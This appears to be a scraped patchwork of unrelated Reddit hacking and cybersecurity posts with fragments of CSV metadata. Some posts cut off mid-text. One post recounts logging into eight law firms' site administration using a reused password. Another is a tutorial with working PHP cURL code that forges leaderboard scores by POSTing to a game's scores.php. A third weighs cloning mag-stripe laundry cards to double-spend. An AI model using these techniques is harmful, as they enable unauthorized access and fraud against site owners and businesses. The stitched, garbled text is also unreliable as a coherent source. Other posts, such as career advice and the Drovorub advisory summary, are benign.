This got us thinking about how many other clients of this developer may have the same password as our site. I did a bit of scouting around and found a number of their clients' websites, guessed the cms login page (all the same), then worked out which employee was likely to have access to the back-end - then I tried the password.... This gave me complete access to the website of 8 law firms in the UK with full administrator access enabling me to make full content and image changes.

I posted this on a forum and one guy gave me a link to a contest, with the subject to code vulnerabilities, that look like coding errors. Like, when somebody finds out the exploit, the company can say it was a coding error instead of it looking like a coded backdoor in fact. This convinced me that LE could have used this type of 0-days to go after criminals and terrorists. At the same time the companies, like Windows for example wouldn't create an image problem: Who will use Windows, when they know, that the US gov. has a hidden backdoor? When an exploit is found by one of the worldwide security labs or private hackers, Microsoft simply come up with an update and nobody cares anymore. They might already have multiple of these ""intended errors"" planted in Soft- and also Hardware. Now after the NSA/Snowden releases it became clear, that they were not only able to, but in reality already using illegal techniques to arrest whoever they want to.

I have already contacted many with potential ways of fixing this hack. Please be responsible with it, and report the vulnerability to the owners of the websites that you find that this hack works on.* First, you need to find an appropriate website to hack. For this hack to work easily, make sure you have Google Chrome installed. Find an online game (such as the [Polka Dot Game](URL and open Google Chrome's [""Developer Tools.""](URL Next, you're going to want to open the ""Network"" tab. Make sure the circle at the top left of the ""Developer Tools"" window is red. Play the game until the game asks you to submit your initials (yes, this means that you will have to get a high score). Now, just play the game once, and monitor your ""Developer Tools"" window. At the bottom, a row should pop up on the table with the name ""scores.php."" Click on the ""scores.php"" row and a new window should open up. Make sure you're on the ""Headers"" tab. Scroll all the way down in this new window until you reach the ""Form Data"" section. Depending on the game, this could contain from one to five values. The main ones we're interested in are ""int"" or ""initials"", and ""score"" or ""points"" or ""p"". In this case, we're looking for ""int"" and ""p"". Don't worry if you don't see ""int"" in this example, because you have to have a pretty good score to be able to enter your initials. Open up PHP. The following code will end up contacting the website and telling it we ""won"" with a high score. &lt;?php $int = 'AAA'; //your 3-letter initials $score = '500'; //your score (must be less than 998 for the Polka Dot Game) $url = 'URL $myvars = array ( 'int' =&gt; $int, 'p' =&gt; $score ); $ch = curl_init( $url ); curl_setopt( $ch, CURLOPT_POST, 1); curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query($myvars)); curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt( $ch, CURLOPT_HEADER, 0); curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1); $response = curl_exec( $ch ); ?&gt; Most of this code is pretty self-explanatory. We tell CURL to send `$int` and `$score` to the website, and it POSTs the request to `URL This is a pretty simple way of hacking into a leaderboard, and I hope you all found this tutorial useful!

Social media chatter can very quickly amplify the damage that could be done to your business..."" I think you need to consider this when planning. Even if you don't do eCommerce or offer services via the web, reputational damage can be significant, especially when coupled with another attack. Think of this situation, you get breached, and the info is leaked on to the interwebs, in the meantime a DDoS attack is taking down your website where you could provide statements and other information. I personally think any time you have a website representing your organization, you should have at least rudimentary protection against a DDoS attack, even if it just lies with your hosting provider. Guideline 5 also goes against some of my better judgment. You should certainly have had some sort of method to preserve forensic data first. I would suggest building in a way to restore a new system while being able to preserve the old system as well. This way you dont destroy information you may need to fix the vulnerability, determine exactly what was compromised, determine if they spread to other devices/systems from that one, or even if they came from another infected device/machine, etc. In a VM world, have a drive ready and available to quickly transfer the bad image to for later detailed analysis, otherwise have a way to image the machine in a mountable format. Dont just format/restore from tape over your valuable logs/files and ways to keep this from happening again or spreading. Test this along with your tape/backup strategy (You do actually test that, right?). It is also important to have an idea of the root cause before restoring as well. Im not talking about a super deep dive here, just a good idea of what happened and how to prevent it from happening again. If the root cause of a breach is a SQL injection leading to elevated privileges and you just restore the system without knowing why the breach occurred, you are just putting the new system out there with the same vulnerability and will likely be in the same boat again, or in a worst case scenario, the bad actor will know better how to not be discovered this time. I do think a DR strategy is important, just use your brain and dont make assumptions about things you arent sure of. The more real-time your business is, the more important it is to be ready for these things so you can put services back online quickly. "

Then they proceeded to overwrite the index.php file and uploaded some malicious files. Result: website displayed a ""This site hacked by *******"" with a whole bunch of derka derka sh*t all over the place. Fix: reset root password for cpanel/ftp through WHM interface. delete all offending files from website root directory. upload Drupal 7.35. reset password and username for admin account through phpmyadmin. log in to drupal, run updates, delete malicious page content. check logs, look through all files, change passwords again. I saved the encrypted php hack script if anyone is interested in looking at it.

How long did it take for you to get through the Kali course? How much time did you need in the lab? Any additional study materials recommended? Is it worth the trouble to get the cert?

Any of you guys are talking about reading books and websites like ""A Hands-On Introduction to Hacking"", or using some pointless online 'hacking' tutorial and BackTrack Linux, packet sniffing -- basically anything about ""leet black hax CLI masterace"" ... Maybe I got a bad/limited first impression but based on the large number of subs here I'll bet this makes up the majority of the base. This is not hacking. Don't do this shit. Anyone new to these concepts or interested in them, go out onto a university website and look for some actual computer science courses. MIT has some. Learn C. Learn computer organization and architecture. Memory. Data Structures. Algorithms. If you can't stick it out through that shit then this stuff isn't for you. If you don't want to learn languages, you will never make it outside of this as being a really lame scripty hobby well suited for a teen. Start with computers, not with 'hacking.' Any book with the word 'Hacking,' plainly, is mostly a joke fucking book teaching you glorified ""advanced operating system use"" that you're wasting your money on. It starts in the wrong place, covers the wrong topics, and won't give you any skills to build on. It'll give a couple more tools to make you feel cool, but nothing more. It will, at most, make you a script kiddie. Do not fall into the trap of only buying books and trying to self teach only through reading random topics of your choosing either (unless this is purely a hobby and you want it to take 5-10 years for you to get anywhere meaningful). Take classes, because classes have guidance, and in this field you need directed progression to move through the relevant topics, eventually leading to an almost given understanding of what vulnerability testing means when those topics tie together. Then you explore vulnerability further. Any book considering anything vulnerability related is far out of your league to fully comprehend and wield as a beginner. Protip: Black hats, in effect, do not exist today on any large scale. Most black hat claims are made by script kiddies with botnets (Lizard Squad, any group with a twitter account is de facto noob). Anyone worth their stones doing vulnerability is making money, probably government. You don't want to be a black hat. Taking the white hat route will excel you past any retard 'black hat' that can't get a job and then you go dark (for whatever reason you don't like money or whatever). EDIT: Downvotes, but no counterarguments. You feeling the zing script kiddies? EDIT2: To anyone passing by that has a serious interest in security... This is not the path you want to take. Following other peoples work is not where you want to go. Move on to serious academics, either free classes or a degree (degree is not required) if you're serious about this stuff... My current mentor is on a leading team at DARPA CGC. Trust that what is recommended here is not innovative in any way. Security is all about innovation."

Further details on Drovorub, to include detection techniques and mitigations, can be found in the joint NSA and FBI Cybersecurity Advisory. &gt;""This Cybersecurity Advisory represents an important dimension of our cybersecurity mission, the release of extensive, technical analysis on specific threats,"" NSA Cybersecurity Director Anne Neuberger said. ""By deconstructing this capability and providing attribution, analysis, and mitigations, we hope to empower our customers, partners, and allies to take action. Our deep partnership with FBI is reflected in our releasing this comprehensive guidance together."" &gt;For the FBI, one of our priorities in cyberspace is not only to impose risk and consequences on cyber adversaries but also to empower our private sector, governmental, and international partners through the timely, proactive sharing of information, said FBI Assistant Director Matt Gorham. This joint advisory with our partners at NSA is an outstanding example of just that type of sharing. We remain committed to sharing information that helps businesses and the public protect themselves from malicious cyber actors. &gt;Drovorub is a Linux malware toolset consisting of an implant coupled with a kernel module rootkit, a file transfer and port forwarding tool, and a command and control (C2) server. When deployed on a victim machine, Drovorub provides the capability for direct communications with actor-controlled C2 infrastructure; file download and upload capabilities; execution of arbitrary commands; port forwarding of network traffic to other hosts on the network; and implements hiding techniques to evade detection. &gt;Drovorub represents a threat to National Security Systems, Department of Defense, and Defense Industrial Base customers that use Linux systems. Network defenders and system administrators can find detection strategies, mitigation techniques, and configuration recommendations in the advisory to reduce the risk of compromise.

Now, before we get into the technical details, first some background about me. I have a Master of Science in Computer Science with a concentration in Telecommunications and Network Security. I have a Bachelor of Science in Information Technology with a concentration in Computer Forensics and a double minor in Computer Science &amp; Cybersecurity. And I have been a member of a Red Team for the past couple of years. So what are you going to need to know to be a Hacker? Here are the key concepts from the Study Guide that I used to prepare for an exam to get my Red Team Job Here's the list: - Programming/Scripting. You'll need to know basic programming concepts, and how to read and interpret scripts/code. You will need to be familiar with Shell scripting (e.g., cmd, wmic, bash), Interpreted languages (e.g. Python) and how to Interpret source code and scripts (e.g., Flow, variables, loops). You should be pretty familiar with a Scripting and/or programming language. You'll be able to find tons of information online regarding learning how to code. - Computer Architecture &amp; Networking. You'll need to understand the fundamentals and theory behind computer design, computer networking, and basic computing concepts. Some things you should be aware of is, Computer Math numbering systems and conversions, Computer concepts (e.g., CPU architectures, virtualization), Memory organization and layout, Storage concepts (e.g., hard disk drives, solid state drives) and the difference between kernel and user space. A good resource for learning this is [Computer Organization and Design ARM Edition:The Hardware Software Interface](URL - Operating Systems (Windows and Linux/UNIX). You'll need to learn of computer systems administration, software interactions and I/O interactions in either Windows or Unix implementations. Some things you'll need to know are Standard administrative commands, Local system configurations, Data security and integrity protection, Antivirus concepts and file systems. A Great resource for learning Operating System is the book [Operating System Concepts Tenth Edition](URL That website contains tons of useful information for that book including slides and study guides. But as a prerequisite for learning Operating Systems you should already be familiar with basic data structures, computer organization, and a high-level language, such as C or Java. - Network Design. You'll need to be aware of the operations, management, and maintenance of computer networks, protocols and standards and how they integrate with one another. Some things you should be familiar with are IP / subnetting, Ethernet, Routing, Network layout and design (i.e., network typology) and Networking device concepts (e.g., routers, firewalls, intrusion detection systems). There is a great CCNA prep course available [here](URL that you can learn this from. A good book to learn about Networking is [Computer Networking: A Top-Down Approach, By James F. Kurose](URL [This](URL is also a good resource for learning about networks from a security point of view - Networking Applications and Services. You'll need to know Protocols, and ports for standard network services, Network services and ports on standard Windows/Unix installs, Network-related commands and Network service administration and configuration. For this you can use the resources from above. So those are the Fundamentals that you need to know to become a Hacker. Once you have those down, you can move onto learning some more advanced concepts. Some of those concepts would be: - Information security tools and techniques: Network monitoring, Network mapping, Vulnerability scanning, Penetration testing - Offensive information security - Digital forensics and data recovery - Voice/data communications (satellite, RF, wireless, and telecommunications networks) - Public key infrastructure and encryption systems - Command line tools - Network traffic analysis - Computer and network forensics - Vulnerability and malware analysis - Low level protocol and packet analysis So I am aware that many people want to become a Hacker or Penetration Tester professionally so I will briefly be discussing how one can best do that. **Education**: For a Degree, i'd recommend a degree in Computer Science, Computer Engineering, Computer Security, Cybersecurity (Technical Track), Cyber Operations or Information Technology. I'd recommend attending a school that is either an NSA Accredited [CAE-CD](URL or [CAE in Cyber Operations](URL **Experience**: You're going to need some experience if you're going to become a Pen Tester or Red Team Member. Some good experience to gain would be UNIX/Linux system administration, Windows system administration, Network Security, Network Administration - security and engineering, networking equipment (routers/firewalls/switches) and VPN administration **Certifications**: Some good entry level Penetration Testing Certifications would be the OSCP, very practical and well respected. And the Security + is generally a baseline for Security Jobs. And i'd advise against the CEH, its not practical at all and you can just memorize the answers and pass without actually knowing how to hack anything **Good ways to practice**: Theoretical knowledge is nothing if you cant practice it. There are a number of different ways you can get experience in Offensive Security (Legally of course). Capture the Flag Events such as the National Cyber League are great ways to apply your knowledge. And HacktheBox (while a bit more advanced) is probably the closest you can get to a real world Network Penetration Testing environment. **Conclusion**: I couldn't cover everything here, but I hope I was able to give you guys some solid knowledge that you can build on. Feel free to ask me any questions or send me a message if you have any questions. Thanks!"

The whole atmosphere reminded Gene Kelly singing in the rain: the speed and connection made you uncomfortable, but anyway you were happy to have it as it was. Nothing seemed to pose a danger; email servers were configured as open relays, meaning they allowed anyone connecting to send emails to anywhere. This practice was abandoned years later when cybercriminals began exploiting open relays. Today, almost 30 years later, there is still no univocal solution to counter spammers, and so the businesses are left vulnerable to social engineering, and impersonation in particular. Social Engineering and Impersonation To begin with, lets recall what is social engineering and which of its methods well talk about today. Social engineering is a science of manipulative psychological techniques and methods to trick users. It has many faces, such as phishing, spoofing, impersonation, and others. Impersonation as such is an act of impersonating a trusted individual. Adams, in his Encyclopedia of Cryptography and Security, described impersonation attack like the one when a criminal successfully assumes the identity of one of the legitimate parties in a system or a communications protocol. Needless to say that such attacks are generally targeted at corporate employees to receive large sums of money or sensitive information. The Structure of Impersonation Attack As every attack, impersonation is usually planned and structured. It doesnt mean that a criminal nurtures a plan for as long as Le Comte de Monte-Cristo did but anyway the more money is at stake, the more sophisticated the plan is (lets not forget that the recent Binance hack was possible thanks to specific social engineering techniques). Most of the social engineering attacks are executed in a further way: Set a Goal Usually, the attacker intends to make a victim perform actions that will violate the borders of personal cybersecurity, for instance: make money transfers to pay fake invoices; share sensitive data related to a company or its clients; click on hyperlinks to take over the computer and/or steal user credentials; open a file attachment to install ransomware and encrypt files on the companys internal network and hold them for a ransom. 2. Find A Target Be alert, social media profiles such as Facebook, LinkedIn, Instagram, or Twitter are the most accessible mediums to collect information about a future victim as theyre the most popular ones. The attackers easily fetch your name, email address, school, friends, job title, job duties, location, etc. Social engineering attacks dont require profound technical skills, as all the information needed is freely accessible online. 3. Build Credibility After examining the target, an attacker now has to wear a mask of whom they are going to impersonate, resorting to social engineering research again. It can be the targets boss, a company selling the services, or an influencer. A perfect mask is found during the research; a vulnerable place is identified and pointed. 4. Execute an Attack The final step is to launch an impersonation attack. The scammer starts communication with the victim, proving the credibility and building trust step by step. How is the attack performed exactly? See below! Example of Impersonation Attack Being a new company in the market means that many people offer you their marketing services. Everyone promises to give the best exposure and assures that their methods are innovative and efficient. However, there is one more group of people  scammers  who want to make a profit without giving anything back. At least several dozens of scammers have contacted ROKKEX for the past few months, and today we want to tell you how to identify an impersonator and not let your employees spend money in vain. Lets start from the basics. CoinTelegraph is a widely-known media outlet in the cryptocurrency world. Unique and catchy pictures, up-to-date news, and quality analytics have made the platform a Forbes in the cryptocurrency. A review on a new blockchain project costs at least 1 BTC but will bring much value and exposure. CoinTelegraph is one of the first outlets that come to mind when advertising a project. Thats why its so juicy for a criminal to pretend that theyre CoinTelegraph sales forces. Check the email we got this morning: A savvy specialist will notice that the email is informal and unprofessional. Yes, in the cryptocurrency world, were slangy but not enough to sell the service with the expression Market is going too good. Besides, the link. Seriously? A person working in Tier 1 media outlet should provide you with insights from GA at least and not make you DYOR (do your own research). Okay, these are minor details, and they dont usually point out to scammers (some companies do have a poor email communication). There is another significant hint that makes us no longer doubt that a scammer is targeting us. Compare: john@cointelegraph.com john@cointeligraph.com Telegraph VS Teligraph. One tiny letter makes a huge difference. This email was immediately identified by Gmail as spam and has a grey banner on it, so youre less likely to ever fall victim of such an amateur scammer. Nevertheless, remember: always check the senders email; it shouldnt have typos, contractions, numbers, or anything that makes it differ from the original domain name youre dealing with. This is how it looked like in ROKKEX mailbox: Impersonation attacks are known to be executed widely in emails; however, when instant messengers and social media started gaining traction, cybercriminals widened their scope of activity. Today, you can meet an impersonator everywhere in the digital world: Facebook, Instagram, Viber, WeChat, etc. We met one in Telegram who pretended to be Doug Polk Crypto. One step at a time! Doug Polk Crypto is a YouTube influencer who created his cryptocurrency channel comparatively recently (slightly more than a year ago) before he had been making videos about poker. The new channel focuses mostly on denouncing YouTubers who are either promoting Ponzi Schemes or making videos just to maintain viewership. The smaller part of his content is devoted to his informed advice on which coins to buy and sell. At this time its unlikely that Doug Polk Crypto will make a promotional video about a new cryptocurrency project, as thatd mean that hes changing the focus and becoming one among numerous crypto bloggers; now hes respected for uncovering Ponzi schemes and shaming unfair players. Nevertheless, our second scammer didnt have that in mind when contacting us. So, on May 28 somebody named @Dougcrypto\_02 wrote Hello to ROKKEX. \*The nickname is not complete and this 02. Who are you? A devoted fan? Or maybe a scammer? We didnt have a second thought and jumped into the game. It promised to be fun  (spoiler: and it did!). The guy immediately offered us an eye-catching video review and Q&amp;A interview. Doug Polk Crypto has never done that before in his YouTube channel, and we were honored to be the first. Well, thats flattering! Thank you, scammer. Here comes my favorite part. For the review, a fake Doug Polk Crypto charged 7 ETH ($1 889,419 on May 28). Our marketing specialist is an efficient person (and with a good sense of humor), she decided to continue the conversation and bargain a bit. She told we could pay only $300. You know what? He agreed! Without thinking twice, he agreed to make 2 videos for $600 (he was definitely passionately in love with ROKKEX; unfortunately, scammer, thats not mutual). A respected and famous YouTuber decreased the price for a review by more than 6 times! Why? , the scam didnt require many resources (if any); thats why it was better to win at least $300 rather than $0. Oh yes, we asked to pay in fiat; surprisingly, he rejected . Then, we asked to give his credentials for us to prepare a service agreement. Yes, ROKKEX is law-abiding, so were making business according to law and regulations paying taxes and being 100% transparent not only in the cryptocurrency world. He sent us an invoice. Check it: Lets agree, not everyone can prepare a decent invoice, but this is the real masterpiece of haste and carelessness. We decided to check the address. Get ready for it! In the middle of Nevada desert! At that point, 3 days later, we already got tired of him. We stopped answering the messages when a few days later, a fake Doug Polk Crypto called himself. We heard an Indian accent asking when we were going to send the payment. In reply, we stated that no cent from ROKKEX would fund his malevolent venture. Some days later, @Dougcrypto\_02 deleted his account in Telegram. Why Are Impersonation Attacks Hard to Detect? A major reason impersonation attack is hardly detected by users is ignorance and lack of attention to details. A tiny spelling mistake makes a huge difference, and seemingly a legit party appears to be an evil scammer. Sometimes its hard to figure out the irregularity, especially when you have a hectic schedule at work and many distractions. However, employees should be made aware of this type of attack not to put the company at risk. Just consider the numbers: In 2017, the U.S. Federal Bureau of Investigation (FBI) warned businesses about the growing threat of impersonation attacks and estimated that such attacks had caused losses of approximately $5.3 billion globally. According to ACCCs Scamwatch revealed Australia alone reported over $4.7 million losses caused by impersonation attacks that year. We gave examples of 2 different impersonation attacks: one conducted via email and the second via instant messenger  Telegram. Both were obvious scams from the very beginning; nevertheless, our cumulative experience in cybersecurity is 20 years, and we trace such scams easier than an average user, but its not always like that. Cybercriminals are witty, in chase of profit they can spend a lot of efforts and resources. You can never claim that youre 100% safe from a hack. Preventative Measures There is no univocal remedy against social engineering and impersonation attack in particular; however, there are measures that educate employees and make them prepare that they may be targeted. SOP. The SOP is an abbreviation from a standard operating procedure. It is a set of step-by-step instructions compiled by a company to help its employees carry out complex routine operations. Your company should have this kind of guide in cybersecurity to define how an employee should carry out communication or perform their duties. SOP usually saves not only hundreds of working hours but also hundreds of thousands $. 2FA. We do trust this measure and mention two-factor authentication almost in every our article for a reason. Adding 2FA to email where possible protects your business email from unauthorized access. Privacy. They say that when you have a profile in social media, you can no longer stay private. True. Thats why, as a company manager, you may implement a corporate policy of not sharing work-related information online. Remember, the more information is publicly available about your company, the easier for an attacker to find a scope for the attack. URL"

I started with the search function, but as most of us know, the reddit search is less than perfect. BLUF: I want to build a cyber range for CTF events. I'be been using Capture the Packet and CTFd. io for a while and I'm a fan of both systems. The big problem is cost. My organization doesn't want to lay out another $500k for a CTP, and the monthly subscription model doesn't play nicely with our bean counters. Because of this, I'm looking for more of an open source or downloadable option. I've got hardware. I've got a lab environment where I can develop. I've even got backing from supervisors to develop something in house. I would personally prefer not to re-invent the wheel however. Does anyone know of something that might meet this need? I've looked at OCCP, but it's seemingly defunct, so that's out of the picture right now. Any info someone might have would be appreciated."

Ive decided to ask and perform a bit of hacking/pentesting in order to see what can be done with this type of system because I can use this project for a Senior Project for my Bachelors in Cybersecurity. The only information known is the machine that accepts paper money, the mag stripe card, and the mag readers on the laundry facilities, plus your normal business hours and who works there. Ive come up with a couple general ideas to try. 1. I create a mag stripe spoofing device to send a signal to the mag reader in the hopes of cheating the systems and simply do trial and error to see if it works. 2. I ask for a mag stripe card and try to reprogram it myself to mess with the system. 3. I ask for a mag stripe card and use it to get an understanding of the current architecture theyre using to see if any vulnerabilities exist that I can exploit easily. 4. I get the mag stripe card, load it with some money, and see if I can copy it to other mag stripe cards and creating a double spend situation. 5. I try to tap into the network connections in the laundry facility to see what devices and vulnerabilities are there, if any. The issue Im having is that I know very little about mag stripes. I know theyre relatively insecure, and I know how to follow a blog/YouTube video, but I dont have the experience to tailor those to what I need. I am looking for some help/guidance on my ideas to see what might be the most viable option."

Many Programming Languages are based on and written in C and the best thing is that most of the tools are designed in C, so just master it! 4) Learn Networking - You have to learn this! I mean seriously! It is really going to help you in Ethical Hacking courses as there are a lot of networking stuff in Hacking like IP, Port, Host, Wires (seriously) etc. 5) Learn as many Programming Languages as you can - It is a real headache for any cybersecurity student. Why is it so important? Because you are a hacker and you have to hack Everything! It's the reality! 6) Learn Real-world Communication skills - It is a neglected thing but believe me it is very important! You will know yourself someday! 7) Take genuine Ethical Hacking courses - It is important to learn everything in an in-depth approach! So make sure you take genuine courses ___________________________________________ So these were the things that you need to learn and believe me it's just a small corner of IT!

There are still, however, ways for hackers to bypass the barriers to entry that 2FA attempts to create.

Of course, I have the resources the professor provides, but I want to hear from you guys! We will be covering the following: Security policies and security levels: confidentiality policies and integrity policies. Access control: principle of enforcing security policies; identity: subject, object and role; mechanisms and practice: firewall. Software security: malicious logic; buffer overflow; vulnerability analysis Cryptography and applied cryptography: ciphers; encryption and decryption; authentication; key management. In addition, we will be doing network, system and crypto programming. Thanks!"

437,cybersecurity,hacking,Information monoculture challenge: policy-based vs reputation-based trust,1,aoggow,https://www.reddit.com/r/hacking/comments/aoggow/information_monoculture_challenge_policybased_vs/,2019-02-09 00:22:40,"Recently I have published an [article](URL about different trust models in cybersecurity. And would like to discuss here two basic approaches that should be used to propose a perspective of evolution and diversity for current protection on the internet. Basically, there is two way to secure connections as I understand: **Policy-based trust.** Using policies to establish trust, focused on managing and exchanging credentials and enforcing access policies. Work in policy-based trust generally assumes that trust is established simply by obtaining a sufficient amount of credentials. **Reputation-based trust.** Using a reputation to establish trust, where past interactions or performance for an entity are combined to assess its future behavior. Research in reputation-based trust uses the history of an entity's actions/behavior to compute trust, and may use referral-based trust (information from others) in the absence of (or in addition to) first-hand knowledge. Anybody can create a server and become a Certificate Authority in the current system of network trust. Of course, there are interesting policy-based approaches to secure the current certificates-based system by **Merkle Consistency Proofs** and **browser policies** from Google and other market players. For more proficient levels of cybersecurity, you can find PGP technology that adds **offline certificates signing** steps where you trust your counterpart if there are enough trusted signatures in his public key. The network of trust represents reputation-based trust where participants that support the work of the distributed storage have a certain [priority rate](URL **based on their behavior** in the past. Shortly network of trust or [PKI (d)](URL represents a couple of nodes interconnected into a small blockchain network and some client applications. If one node fails, the system switches to another node. Each node has the same data, the same logic, and the same API. These nodes also replicate all the data, all the transaction history, and all the certificates statuses. What has more priority in the network security future in your opinion: policies or reputation? Which examples of reputation-based security solutions can you mention?"

Year of how packets travel across the world at ease. Years learning programming languages so that I could be able to create the next big security hit. With that in mind I wanted to ask whether doing research or penetration testing seems like a good fit for me. I'm at this moment leaning towards Research because I've been told that it's hard to get into(which I love because of the challenge and how exclusive it seems). And because it seems like I will always be discovering and help develop new thing's in the security field, while with penetration testing is more of you just trying to make sure a client knows there weakness.

Meng Wenzhou, the chief financial officer and daughter of the founder of Huawei, was arrested in Vancouver, Canada, evidently not related to Huaweis alleged spying, but because of breaking U.S. sanctions against Iran. While Huawei is the worlds second largest seller of phones after Samsung, their products have not been sold by the U.S. major cellphone carriers for more than a decade Weve been looking at Huaweis phone hardware in our labs, and have been speaking with other cybersecurity experts whether anything has actually been found in the Huawai phone hardware that could allow unfettered data being sent, and to date we have yet to find anything nefarious. While Huaweis integration of software, particularly related to the data controllers in Huaweis apps for its phones, such as in HiCare, are intrusive and can access many of the resources in your phone (default settings allow this access), such software and intrusion isnt much different from other phone manufacturers. Not finding obvious security concerns in the Huawei phone hardware doesnt necessarily translate that other Huawei products, such as networking devices, arent doing nefarious things and theres always a possibility that some of the chips within their phones may only phone home after some specific actions have been taken to activate them. Of course out-of-band exploits in the actual chips within the phone or the firmware could be discovered in the future. To date there have been no intentional malware or exploits found within any hardware devices from any manufacturers though the Spectre and Meltdown bugs in Intel, ARM, and AMD chips were potentially exploitable. So, why is all of this happening with Huawei now? There is currently a great deal of political pressure being put on the major cellphone carriers regarding Chinese cellphone products. It hasnt been any secret that Apple is having problems selling as many iPhones as they were hoping. Since Huawei is currently locked out of the U.S. major cellphone carrier market whats happening with Huawei may not seem surprising. While you can still purchase a Huawei phone from a non-cell carrier, such as an unlocked version on Amazon, this still represents a small slice of the U.S. telecom market. Is it possible that this is much ado about nothing and that Huawei isnt truly spying on the U.S. via their cellphones? This may actually be nothing more than economic strong-arming against the Chinese tech giant. For now, if you have any concerns, we recommend staying away from Huawei phones until theres conclusive evidence one way or the other."

462,cybersecurity,hacking,"Can an ISP, in particular a smaller local one get hacked? Could connected customers also be hacked then?",2,9iapuf,https://www.reddit.com/r/hacking/comments/9iapuf/can_an_isp_in_particular_a_smaller_local_one_get/,2018-09-24 04:38:39,"This is mainly a security question, as Im not trying to increase my capped speed or anything. Bear with me, as I am going to explain everything in detail. So anyway, theres this small WISP where I live. Right now I have DSL through AT&amp;T, and it sucks. At most I can get just a little over 5 Mbps. Usable, though extremely slow to download anything. The WISP just put up a tower only a few hundred feet from me, so I should get decent signal, and I would assume that ping shouldnt be terribly high. I have also been told that speeds can reach up to 50 Mbps, with a minimum of around 25 Mbps. Heres the catch, well at least in my mind. This company is small, really small. I have no idea how good their security is. I live in a neighborhood which became a small town of just 200-300 people at most, outside of a town of a little over 40,000. Basically a retirement area, with a golf course and a lot of older people. I would assume by default that a vast majority of these folks connected to this tiny ISP would be infected with at least some malware. This is just honestly probable. Im just concerned as to what would be keeping my devices secure, and web traffic safe if I connect to this WISP. The network engineer is young, and a really nice and professional guy. He seemed pretty flakey and unsure what I was asking though when I asked him about what ping there would be (this was before the tower near me was constructed). I also asked about security, and according to him the owner of this company apparently has some sort of cybersecurity expert check things periodically. The owner basically has other people run this stuff for him. He also owns the golf course, as well as the country clubhouse where they keep their servers and networking equipment in the basement. Apparently, this small company also plans to run fiber to everyone out here eventually, as they are already using some. I made an appointment to have the engineer come to my home on Tuesday morning, to get me hooked up to their wireless service. Again, my only real concern with this is security. As more local ISPs try to spring up, which of course is a good thing whenever they can, how big of a concern is security? I havent been able to find a lot of information on this. The only disturbing things which I have read mainly dealt with man-in-the-middle attacks, and compromised routers. How common would MITM attacks be over an ISPs network? I always keep my routers firmware up to date, use the recommended encryption methods, set strong passwords and set an admin password, as well as change/disable certain settings according to the many guides on how to secure a router. Not really too worried that Im not doing what I should be in that regard. Would it be possible to get a malware infection, or to have your data maliciously intercepted from an ISP, or another individual connected to it? Should I at all be concerned about something like this if I use a small internet service provider? I always try to make myself as secure as I can online, and obviously dont want my gaming rig to become infected with malware, or have any of my data compromised. TL;DR: Basically wondering what prevents an ISP from getting hacked, and what prevents user data along with their devices from being compromised. Wondering especially about how great of a risk smaller ISPs are from being hacked, and if the users of these internet services should be at all concerned, as well as what they can do to try to protect themselves from this. Couldnt find a lot of information on this, and figured hackers would know more."

I recently found out that my friend has apparently had his primary email hacked. He is not the most cybersecurity savvy so he asked me for advice on what to do. Credit Wise notified him that his email was found on the dark web and the status on the password said exposed. He still has access to the email and it seems that none of his accounts on other websites have been compromised. Would it be correct to conclude that basically his email has been hacked and someone has had access to the account along with all the emails and information inside? And if so, to follow up, what would be the best course of action to re-secure and seal off his account security wise? * He said the email is the primary email he uses when creating accounts on other platforms, so should he be worried about a hacker gaining access to those other accounts through password recovery? * And what of the issue of identity details? If his email is likely to contain any details of personal information, should he be concerned of the risk that those details may already be saved and out there for use of identity theft? * Finally, what security measures should he take to best deal with the situation? Since he still has access to the email and no malicious action has seemed to have been taken yet on any other accounts: **1.** Would simply changing the password along with adding 2-step verification be sufficient enough to re-secure it. Should he possibly consider starting over completely, creating a new email and moving all of his accounts over to that? **2.** When an email has been compromised once, is there anything that the hackers can gain that would allow them easier re-access later on in the accounts history in comparison to if they had to just break into a new account? **3.** Im guessing it would be pretty common sense to assume that any other accounts that he has created with that email and therefore uses that email as a password recovery for has also possibly been compromised and should have the password changed? Sorry if this post is a little lengthy. My friend came to me for advice on the situation and these were the possible things i could think of that he should be concerned about. Im definitely also not an expert on the subject so i thought Id see if anyone could elaborate on the thoughts. Any help or insight would be very highly appreciated and thank you for taking the time to read. _TL;DR:_ Friends email was reported hacked by Credit Wise and the password exposed. **1.** Are his other accounts created using the email at risk? **2.** Should he be concerned of his personal info being out there for identity theft? **3.** Should he just change pass or make a new email completely? **4.** He probably has to change all other passwords associated with the email right?

I'm a student at a University in Massachusetts and I'm studying economics and computer science, and my interests have always lied in Cybersecurity and hacking. I got into it at a young age and played around with Metasploit and backtrack and watched a lot of Defcon videos just learning as much as I could. Anyway, I'm wondering if it's possible to major in Econ at a university and pursue cybersecurity in a graduate study and whether people that work in the industry right now recommend this. I'm at a school that doesn't offer cybersecurity, and I would have to transfer to learn about it. I'm currently working on a computer science degree as a freshmen but I genuinely hate some of the work that were doing and how tedious it is. I don't enjoy how down-to-the-basics that computer science can be, and I prefer working with bigger concepts like networking and things of that nature. I'm wondering if you guys think a computer science degree is necessary at all for pursuing graduate study at for instance Carnegie Melon. I would really appreciate any guidance from people in the field. Thanks."

Internet is a wonderful media, but having access to so much information with no control is like having no access at all. What path could provide the tools to become a self-sufficient Security expert in the shortest time? I imagine plenty of wannabe professionals living the same discomfort, feeling completely alone between thousands of Subject Experts. When I first stumbled upon Security, it was trough Caesar Cipher. For me, it seemed the most exciting thing in the world and that day I decided I would have spent all my time unveiled all secrets behind Cybersecurity. Unfortunately, life has taken me on different paths, too far from the object of my ambition. I had two options: to accept it or fight for it! How easy would my life be had I been able to let things go. How could I steer it again in the right direction? I remember myself analyzing plenty of CVs to find out what path other people had followed to get where they were. They must have started from somewhere, right? Maybe if I had been able to mimic their choices I would have arrived there, too. Finally, my eye fell onto an unknown certification: **eLearnSecurity Certified Professional Penetration Tester (eCPPT)**. Never heard of it! I found out a colleague of mine had already completed it and strongly suggested me to try. Buzzwords like practical, labs, hands-on were still echoing in my mind. So, I bought it. No trials, no reviews, just faith in work relationships, the foundation to become Security professionals. My impressions in brief: - **CHEAP:** I could afford it. Thats it! InfoSec certifications usually assume your organization would pay for them, but this is not the case and I think trade-off cost-benefits is really worth a try. - **EXHAUSTIVE:** The course includes everything you need to start your Cybersecurity career. Divided into 5 modules (Web, Network, System, Metasploit and WiFi), it offers PDFs, videos, codes and any kind of additional material to ease the learning process as much as possible. It felt like owning a personal library always available and ready to be consulted. 